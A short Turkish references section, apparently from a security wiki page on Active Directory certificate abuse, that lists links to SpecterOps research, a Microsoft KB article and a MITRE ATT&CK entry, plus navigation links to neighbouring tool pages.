- **SpecterOps Araştırma Makalesi:** [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- **Microsoft KB5014754 Dokümantasyonu:** [Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-adfcba52-d719-480f-92b3-3404aa965ad6)
- **MITRE ATT&CK Referansı:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)

---

> **Önceki:** [← Certipy](./Certipy.md) · **Sonraki:** [Whisker →](./Whisker.md)
